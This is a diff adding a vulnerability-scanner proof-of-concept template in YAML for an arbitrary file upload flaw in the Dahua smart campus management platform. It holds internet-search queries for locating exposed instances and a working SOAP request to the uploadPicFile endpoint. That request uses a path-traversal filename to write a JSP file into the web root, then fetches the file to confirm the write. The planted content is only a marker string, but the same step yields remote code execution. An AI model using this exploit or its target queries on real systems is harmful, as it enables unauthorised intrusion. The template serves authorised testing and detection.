@@ -1,0 +1,55 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="dahua-智慧园区综合管理平台"
+    hunter-query: app.name="Dahua 大华 智慧园区管理平台" | web.body="/WPMS/asset/lib/gridster/"    
+    quake-query: app:"dahua-WP"
+    zoomeye-query: title:"智慧园区综合管理平台"
+    threatbook-query: app=大华
+    cve: 
+    cnvd:
+    tips: /upload/4ndex.jsp   |  绝对路径 /opt/tomcat/webapps/upload/4ndex.jsp
+    
+name: poc-yaml-dahua-zonghe-poi-upload
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /emap/webservice/gis/soap/poi
+            follow_redirects: false
+            headers:
+              Content-Type: text/xml;charset=UTF-8
+            body: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:res=\"http://response.webservice.poi.mapbiz.emap.dahuatech.com/\">\r\n<soapenv:Header/>\r\n<soapenv:Body>\r\n<res:uploadPicFile>\r\n<!--type: string-->\r\n<arg0>/../../4ndex.jsp</arg0>\r\n<!--type: base64Binary-->\r\n<arg1>NHJhMW4=</arg1>\r\n</res:uploadPicFile>\r\n</soapenv:Body>\r\n</soapenv:Envelope>"     
+        expression: response.status == 200 && response.body_string.contains("uploadPicFileResponse")
+
+        output:
+          search: |-
+            "(?P<filename>ico.*jsp)".bsubmatch(response.body)
+          filename: search["filename"]
+          search1: |-
+            "(?P<newpath>ico.*jsp)".bsubmatch(response.body)
+          newpath: search["newpath"]
+
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /upload/4ndex.jsp
+            follow_redirects: false
+            headers:
+            body:         
+        expression: response.body_string.contains("4ra1n") && response.status == 200 
+
+expression: r0() && r1()
